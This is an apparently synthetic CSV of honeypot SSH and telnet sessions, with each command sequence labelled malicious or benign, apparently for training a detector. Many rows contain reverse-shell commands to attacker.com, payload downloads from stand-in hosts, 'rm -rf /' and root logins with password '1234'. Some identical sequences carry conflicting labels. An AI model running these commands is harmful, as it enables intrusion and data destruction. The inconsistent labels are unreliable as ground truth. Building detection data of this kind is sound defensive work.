session,src_ip,protocol,duration,input_token_count,unique_commands,command_sequence,label
1d71c6b0-dfd5-47ca-9b82-237c73fefd02,144.125.116.95,ssh,242.3,18,5,curl -O http://badhost/exploit; ./payload.sh; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/,1
0fa90c0e-c2b1-40ee-9587-86820a90bc8f,35.90.215.102,ssh,261.9,1,2,ls; ,0
idle-extra-98,192.168.100.98,telnet,847.883526,0,0,,0
14bdcfba-948d-4b15-8c45-90f867725382,142.229.193.63,ssh,18.13,2,2,ls; ls,0
580e2a49-6dec-48ef-a343-b8359033cf1b,235.146.6.149,ssh,38.93,2,3,date; ; whoami,0
6a551098-23ba-4875-a56a-bf20011eb9be,4.39.92.38,telnet,541.14,5,3,ls; whoami; curl -O http://badhost/file,1
d61f7e05-9cfa-4545-a599-42cd741bc8ab,22.215.44.12,ssh,89.06,2,2,logout; uptime,0
29904560-151b-44db-9939-9951c334e0f3,188.110.51.113,telnet,659.19,15,5,chmod +x payload.sh; curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; rm -rf /; echo 'pwned' > /tmp/x,1
scan-8,172.16.0.8,telnet,0,0,0,,0
f65057fb-5fef-4696-97d4-8f95ec571fa8,69.2.15.216,ssh,210.09,3,2,ls; date; date,0
f2d308e6-793e-413b-b2a5-e68c09c3b074,188.232.51.75,telnet,290.51,5,3,date; logout; nc attacker.com 4444,0
1846a42c-5fb7-4815-92a2-7ad5e1a0386f,126.69.41.37,ssh,97.36,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
92f8fcd7-92d1-4f4c-88d1-d6b2a669a382,237.26.232.183,ssh,407.22,14,5,curl -O http://badhost/exploit; chmod +x payload.sh; ./payload.sh; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
ambiguous-extra-93,10.1.0.93,ssh,509.1289467,14,6,pwd; nc -e /bin/sh attacker.com,0
53f2217d-6226-450b-81a1-37bd22cea13b,20.68.174.230,ssh,350.89,15,4,sshpass -p '1234' ssh root@target; ./payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; curl -O http://badhost/exploit,1
4fdf6907-e0bc-4c8f-a177-de3fa4bf8106,29.37.195.182,telnet,152.01,4,4,uptime; ; cd /home; exit,0
0c60072d-2ccd-42a2-95c5-9d580a0fcef8,88.222.45.85,ssh,456.45,16,6,./payload.sh; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; rm -rf /,1
e6b6e6fd-f679-4a42-a604-3a9a4a25514d,150.131.27.232,ssh,186.24,17,4,scp exploit.sh root@target:/tmp/; rm -rf /; sshpass -p '1234' ssh root@target; rm -rf /; scp exploit.sh root@target:/tmp/,1
7d955edd-a807-4340-a88a-322b2e31b851,104.78.13.36,ssh,176.85,1,2,; ls,0
a7bab729-a3e5-4a4d-8fc8-cfbc3121b854,223.191.251.19,ssh,274.64,3,3,uptime; ls; pwd,0
6cd3fb4c-eb43-4024-8df3-db02c6a58f1b,138.205.230.71,ssh,94.54,2,3,exit; ; ls,0
70787e0f-2090-4975-88f6-511131ddff8c,50.50.42.65,ssh,275.51,2,3,date; pwd; ,0
633fb738-5129-497e-a0df-8b2fea928e4a,118.232.197.225,ssh,18.62,2,2,ls; uptime,0
d28953b1-d29a-4c7e-8350-d6c591d1e499,132.60.105.13,ssh,141,3,3,cd /home; ; uptime,0
36d91a4c-49a4-44c4-a0c0-ca9238068c89,210.24.219.4,ssh,190.69,2,3,logout; ; logout,0
ambiguous-41,10.0.0.41,ssh,98.59038168,10,2,pwd; curl http://exploit; date,0
d7e8dfa7-4266-40ba-8f60-73f4fb5e0336,6.120.248.223,ssh,279.09,2,3,date; ls; ,0
59b7c446-e535-4362-a8e0-c3aa7d8d52f6,44.177.251.138,ssh,218.42,3,2,cd /home; ls,0
e5ba8c5a-92ce-4d38-872c-7c5bd0582d6a,174.197.12.21,ssh,159.43,3,3,uptime; uptime; ls,0
4faf04ef-9239-4cd3-878d-0914427b0f99,6.75.235.187,ssh,141.64,2,3,pwd; exit; ,0
835c3f74-7f5d-4e85-888e-860d8a38ab54,147.178.227.201,ssh,34.99,1,3,; exit; ,0
00031a04-e704-4ad2-9da8-c4ba46f1a432,121.146.158.112,ssh,454.33,12,4,scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; rm -rf /,1
405fd5c2-e5eb-4696-9854-40e9dea49276,55.120.245.166,ssh,53.76,23,7,scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; sshpass -p '1234' ssh root@target; python -m http.server 8080; curl -O http://badhost/exploit; ./payload.sh,1
a9f50295-230f-4e1e-9cd9-b670edb76c54,107.126.12.20,ssh,236.88,17,5,python -m http.server 8080; chmod +x payload.sh; echo 'pwned' > /tmp/x; rm -rf /; scp exploit.sh root@target:/tmp/,1
682ecd7b-ed0d-4198-b5ab-0adcdf6cf220,140.115.200.92,ssh,240.24,5,3,ls; whoami; curl -O http://badhost/file,0
7d16369e-28a9-49d1-ae58-6ba71321f763,35.41.32.54,ssh,275.73,0,2,; ; ,0
f10342a7-1cb6-4cf5-8fde-170bc055c144,214.151.150.138,ssh,92.91,2,2,; cd /home,0
a9289033-0e5b-44e2-92bd-18cdc324b9fe,104.230.162.108,ssh,22.76,1,2,; exit,0
6f20bd51-1cac-43a6-8de1-7512161afec5,107.227.182.11,telnet,133.38,2,3,uptime; ; uptime,0
4bac9e78-d6fd-4188-870e-e6ae695a0876,55.190.191.25,ssh,122.42,1,2,whoami; ,0
eb5f4d42-e31b-4b1e-abe1-a5bf0d715f9e,223.110.149.240,ssh,151.39,5,3,pwd; echo test; wget http://suspicious.site/x,0
78b7257e-5b97-4734-b54f-f719749f1c68,203.124.56.55,telnet,291.45,3,4,pwd; date; ; whoami,0
3af371d5-330a-4ddd-b46d-41cdd10e6d31,107.156.216.77,ssh,787.87,17,5,echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; rm -rf /; sshpass -p '1234' ssh root@target; wget http://malicious.site/payload.sh,1
55e8a6d3-4ba1-4c60-91ba-fcaecbea3592,211.191.26.9,ssh,268.93,3,2,cd /home; uptime,0
93246dfe-dbcb-45b5-a5a8-38caff4090f5,176.244.217.152,ssh,39.63,3,3,uptime; ; cd /home,0
4f8bfe5d-ead0-45e1-a8d9-9cac82b4bee1,209.161.142.205,ssh,121.16,3,4,date; whoami; pwd; ,0
64a60391-790e-4ca6-ab2b-3d32725cbe33,23.43.239.161,ssh,50.79,5,3,ls; whoami; curl -O http://badhost/file,0
bdc1ab29-351e-4e9b-9853-3bf3ff65f02c,12.251.5.45,telnet,228.54,1,2,; pwd,0
864f2b51-7620-49f6-8f57-7feea5e38c65,145.47.76.81,ssh,221.92,2,3,pwd; ls; ,0
20b35b86-a478-4a24-9266-d359d51d3b86,99.199.222.98,ssh,200.37,2,3,uptime; ls; ,0
ambiguous-extra-124,10.1.0.124,telnet,180.736058,19,6,curl http://exploit; ls; date,0
7175adf9-ed52-42de-8088-90418b77cab0,30.34.80.93,ssh,49.51,2,3,date; logout; ,0
ambiguous-extra-56,10.1.0.56,ssh,93.51507539,10,6,curl http://exploit; ls; wget http://bad.com; date; cd /,0
326081a6-38bf-4894-b2b4-32a7ccffa810,113.218.101.8,ssh,769.92,12,4,python -m http.server 8080; scp exploit.sh root@target:/tmp/; rm -rf /; wget http://malicious.site/payload.sh,1
39eb7523-ce68-4f1f-aff0-2ee496f46e24,99.152.195.164,ssh,221.99,3,3,exit; logout; ls,0
idle-extra-78,192.168.100.78,ssh,725.5466393,0,0,,0
6039381b-64e0-4a12-9ca6-0571965eecd0,69.60.184.129,ssh,160.9,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
scan-extra-4,172.20.0.4,telnet,0,0,0,,0
b78880b6-d04b-4368-8833-17b3f9874336,143.89.29.51,ssh,816.39,12,4,echo 'pwned' > /tmp/x; python -m http.server 8080; ./payload.sh; curl -O http://badhost/exploit,1
75131e07-0af6-4909-ba48-6ff23edd0afd,199.115.165.220,ssh,327.47,19,4,sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; chmod +x payload.sh; rm -rf /; echo 'pwned' > /tmp/x,1
eb36449c-2272-4d64-9ddf-81e2a844d73c,57.177.164.229,ssh,482.91,29,6,echo 'pwned' > /tmp/x; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/; sshpass -p '1234' ssh root@target; nc -e /bin/sh attacker.com 4444,1
f74854f3-de0d-4326-9c3d-5a58df60f101,66.122.170.25,ssh,227.65,2,2,date; whoami,0
04ea2a97-a5ec-4d3a-b07c-988582b1e6b4,246.164.28.59,ssh,176.5,1,2,; ls,0
23275c98-943a-4226-8c1d-540f4840b868,72.149.194.175,ssh,222.09,3,3,pwd; exit; uptime,0
88f8ed2d-7f19-4305-b6f3-844de7378637,57.185.65.218,telnet,326.89,16,5,rm -rf /; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; python -m http.server 8080; rm -rf /,1
3e8ac0cc-32c8-4acf-8ba1-dfced18e2db0,48.31.42.51,ssh,110.02,4,3,date; pwd; pwd; whoami,0
abb4b1e6-e7a5-43d3-822b-bfcec9871b21,40.12.188.192,ssh,488.27,13,3,curl -O http://badhost/exploit; wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh,1
aa1e3101-72b8-437d-9faa-7aeee4da569c,101.227.6.79,ssh,251.72,5,3,ls; whoami; curl -O http://badhost/file,0
9b96f532-f285-4235-82d1-6fb1fefd7987,68.220.112.78,telnet,434.34,15,5,python -m http.server 8080; rm -rf /; ./payload.sh; echo 'pwned' > /tmp/x; scp exploit.sh root@target:/tmp/,1
8d00b2e5-e5d2-43c1-aa14-8e03b9843ab9,154.157.88.175,ssh,139.05,2,3,logout; ls; ,0
b9485522-0b87-4857-8034-3084e0ad5133,114.58.0.95,ssh,99.63,3,3,; date; cd /home,0
7da6091a-9e38-4625-8b1d-a48b9b60e905,87.138.160.139,ssh,748.16,23,5,chmod +x payload.sh; python -m http.server 8080; wget http://malicious.site/payload.sh; chmod +x payload.sh; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh; chmod +x payload.sh,1
29f2f7da-2052-4ad2-9e5e-b1f67cf0f26a,163.91.101.106,ssh,17.71,16,4,wget http://malicious.site/payload.sh; rm -rf /; rm -rf /; nc -e /bin/sh attacker.com 4444; chmod +x payload.sh,1
854d1657-5dbe-4874-a707-abc75cc55ca4,224.255.165.26,telnet,228.46,21,5,chmod +x payload.sh; curl -O http://badhost/exploit; curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; rm -rf /; nc -e /bin/sh attacker.com 4444,1
a6f71b63-053f-4582-877a-1a49e44a9fc4,22.158.137.191,ssh,566.15,13,4,rm -rf /; sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; ./payload.sh,1
55d522a7-bdee-4f19-b24d-09303f32c10c,216.91.177.220,ssh,57.46,4,4,exit; ; ls; cd /home,0
25ba20ff-f283-4f78-9b18-7e39acc76d40,29.243.252.83,ssh,412.56,29,6,sshpass -p '1234' ssh root@target; echo 'pwned' > /tmp/x; chmod +x payload.sh; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444,1
f7f2b47e-1e12-40a4-8358-eb5bbd20226c,130.140.13.54,ssh,54.05,4,3,pwd; date; date; pwd,0
49a62969-98a3-459e-8134-cadce2559941,131.20.123.187,ssh,261.42,5,3,pwd; echo test; wget http://suspicious.site/x,0
7d21e252-d724-4fd7-836b-38d9aea1b0ef,184.195.117.119,ssh,260.31,0,2,; ,0
3042cf7f-a05f-4482-97f3-995ad09b4a75,252.46.14.241,ssh,355.11,18,6,wget http://malicious.site/payload.sh; python -m http.server 8080; chmod +x payload.sh; ./payload.sh; curl -O http://badhost/exploit; sshpass -p '1234' ssh root@target,1
62d6395c-5c0b-452a-b6a2-3fb065380ed0,194.76.200.195,ssh,254.41,3,3,pwd; ls; whoami,0
690670aa-9ec4-4c68-9879-c599381c8501,173.78.22.165,ssh,506.59,25,5,python -m http.server 8080; python -m http.server 8080; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/; python -m http.server 8080; nc -e /bin/sh attacker.com 4444; wget http://malicious.site/payload.sh,1
fab6f02b-ddde-479f-a9dc-d958471af684,30.138.50.138,ssh,163.27,0,2,; ,0
1da6af18-31ac-403c-a262-6b120fe1fb83,13.94.92.79,ssh,283.02,3,3,pwd; whoami; ls,0
5247450e-d4b7-4678-a062-cbf1f1f92fe3,103.246.81.192,ssh,655.07,21,5,curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; ./payload.sh; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit,1
cb4ea78c-0e34-44c6-9272-932d6af5666d,193.39.210.88,ssh,103.58,5,4,date; cd /home; logout; exit,0
36d9a22e-80e2-431f-bf1c-5b211f734c4c,174.112.132.10,ssh,184.84,2,4,; date; whoami; ,0
844eb560-4402-45a5-be15-f3dbe4fb7f5d,81.234.19.170,ssh,115.45,15,4,curl -O http://badhost/exploit; echo 'pwned' > /tmp/x; wget http://malicious.site/payload.sh; wget http://malicious.site/payload.sh; python -m http.server 8080,1
fc9731ab-974a-439a-95cd-842dc731aadf,197.175.192.200,telnet,588.55,19,4,curl -O http://badhost/exploit; scp exploit.sh root@target:/tmp/; nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; nc -e /bin/sh attacker.com 4444,1
12e6c1a2-6717-4585-9e57-b7ff80484739,40.58.132.128,telnet,185.25,20,5,scp exploit.sh root@target:/tmp/; python -m http.server 8080; wget http://malicious.site/payload.sh; nc -e /bin/sh attacker.com 4444; scp exploit.sh root@target:/tmp/; scp exploit.sh root@target:/tmp/,1
0939a890-cad2-46a5-8c51-190b4a0a2df2,220.155.179.168,ssh,673.86,18,4,nc -e /bin/sh attacker.com 4444; curl -O http://badhost/exploit; rm -rf /; python -m http.server 8080; curl -O http://badhost/exploit,1
ambiguous-extra-112,10.1.0.112,ssh,101.8208698,7,3,date; chmod +x payload.sh; cd /,1
681948a3-1be0-487a-8677-49e7f577eb9d,198.233.16.203,ssh,79.58,5,3,ls; whoami; curl -O http://badhost/file,1
80c90d44-9b28-4b74-9c65-e418ddcfd352,187.102.134.238,ssh,108.64,4,4,; pwd; whoami; cd /home,0
99360c03-fa55-4676-87f7-24228f50c569,135.24.33.36,ssh,203.3,2,3,date; date; ,0
c823d255-a270-42e5-bd98-34a5c2f59611,31.92.125.84,ssh,112.05,6,3,cd /tmp; chmod +x script.sh; ./script.sh,0
181279da-a614-401e-8355-cd9ed36c20e8,46.242.215.232,ssh,115.22,5,3,ls; whoami; curl -O http://badhost/file,1
e77074ca-443b-48db-ac71-ef04cc7f930c,172.232.104.161,telnet,142.61,2,3,; ; logout; logout,0
40fb1491-392e-4c79-90c4-4e55e57c7eb1,161.238.163.8,telnet,248.9,2,2,exit; pwd,0
2450f9d3-3eb1-42fc-b6a3-7fbf74d18b4a,11.91.254.177,ssh,6.68,2,3,exit; ; ; logout,0
ambiguous-33,10.0.0.33,telnet,180.1612966,4,4,cd /; whoami; exit; nc -e /bin/sh attacker.com; chmod +x payload.sh,1
941de0bc-5338-4f96-b02f-046bdccfde43,12.168.222.173,ssh,69.72,5,3,pwd; echo test; wget http://suspicious.site/x,0
599e9862-9adf-4ef9-bb85-e1ef1d32fecb,13.130.196.202,ssh,115.62,5,4,exit; cd /home; pwd; uptime,0
de0fe340-3a30-471a-afb8-bddecfe22aad,141.30.106.164,ssh,293.68,25,4,rm -rf /; sshpass -p '1234' ssh root@target; python -m http.server 8080; echo 'pwned' > /tmp/x; python -m http.server 8080; sshpass -p '1234' ssh root@target,1
3b2c7c93-3b76-47c4-9cc8-e0fa279de667,88.243.109.202,ssh,42.43,23,6,sshpass -p '1234' ssh root@target; scp exploit.sh root@target:/tmp/; chmod +x payload.sh; scp exploit.sh root@target:/tmp/; wget http://malicious.site/payload.sh; echo 'pwned' > /tmp/x; rm -rf /,1
6cbec982-193b-4748-a4f7-e11b27f2d33f,211.198.252.36,ssh,275.19,2,2,uptime; date,0
9aa44551-fca0-4ece-bbfe-0c5a84a7625e,223.8.31.180,ssh,161.84,2,2,uptime; uptime,0
7c4cb840-a9d4-4cd5-b78d-0c81188d576e,78.22.11.249,ssh,32.42,3,2,exit; cd /home,0
8f94efff-0519-4f38-ad8f-2436b8f39c93,108.21.146.54,ssh,71.38,6,3,cd /tmp; chmod +x script.sh; ./script.sh,1
2b4c980b-10d3-4534-acac-95ab8f37e49a,203.65.81.124,ssh,62.73,2,4,; ; whoami; logout,0
2e7f2512-7133-48d0-80e0-f1489467bef8,191.187.200.188,ssh,354.51,22,6,sshpass -p '1234' ssh root@target; sshpass -p '1234' ssh root@target; rm -rf /; wget http://malicious.site/payload.sh; curl -O http://badhost/exploit; python -m http.server 8080,1
ecdfb458-8c94-4a6a-9c8f-b54a18551ace,110.53.110.200,ssh,852.19,18,5,wget http://malicious.site/payload.sh; scp exploit.sh root@target:/tmp/; echo 'pwned' > /tmp/x; nc -e /bin/sh attacker.com 4444; python -m http.server 8080,1
208454b4-8dc9-4f5f-9b4a-a07ede53fc96,163.246.51.160,ssh,1.69,1,2,; logout,0
715b491e-204d-4bc3-8e80-a87e7657686a,25.140.197.221,ssh,22.14,3,4,whoami; ls; ; uptime,0
